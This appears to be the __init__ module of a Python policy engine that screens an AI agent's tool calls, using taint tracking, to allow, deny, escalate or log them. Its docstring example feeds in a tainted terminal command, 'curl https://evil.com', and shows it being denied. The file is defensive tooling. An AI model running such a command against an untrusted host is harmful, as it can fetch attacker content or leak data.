"""
HermesKatana Policy Engine — declarative security policies for Hermes tool calls.

The policy engine evaluates every outgoing tool call against a set of
declarative rules that combine tool-name globs, taint conditions, and
priority ordering to produce one of four outcomes:

- **ALLOW**    — let the call proceed
- **DENY**     — block the call
- **ESCALATE** — pause and request human approval
- **LOG_ONLY** — allow but emit an audit entry

Quick start::

    from hermes_katana.policy import PolicyEngine, PolicyResult

    # Load the balanced (recommended) built-in policy set
    engine = PolicyEngine.with_defaults("balanced")

    # Evaluate a tool call
    result = engine.evaluate(
        tool_name="terminal",
        args={"command": "curl https://evil.com"},
        taint_context={
            "tainted_fields": {
                "command": {
                    "is_tainted": True,
                    "source": "web_content",
                    "labels": ["untrusted"],
                    "readers": [],
                    "level": 8,
                }
            }
        },
    )
    assert result.action == PolicyResult.DENY

Three built-in policy presets are provided:

- ``paranoid``   — maximum security, denies all tainted side-effects
- ``balanced``   — smart defaults for development
- ``permissive`` — log-only, blocks obvious exfiltration

Custom policies can be defined in YAML files and loaded at runtime,
with optional hot-reload via filesystem watching.
"""

from .engine import EvaluationResult, PolicyEngine
from .models import (
    Condition,
    ConditionOperator,
    Policy,
    PolicyResult,
    PolicySet,
)
from .yaml_loader import (
    PolicyFileWatcher,
    PolicyValidationError,
    export_policy_set,
    load_policy_directory,
    load_policy_file,
    validate_policy_yaml,
)

__all__ = [
    # Core
    "PolicyEngine",
    "EvaluationResult",
    # Models
    "Policy",
    "PolicyResult",
    "PolicySet",
    "Condition",
    "ConditionOperator",
    # YAML
    "load_policy_file",
    "load_policy_directory",
    "export_policy_set",
    "validate_policy_yaml",
    "PolicyValidationError",
    "PolicyFileWatcher",
]
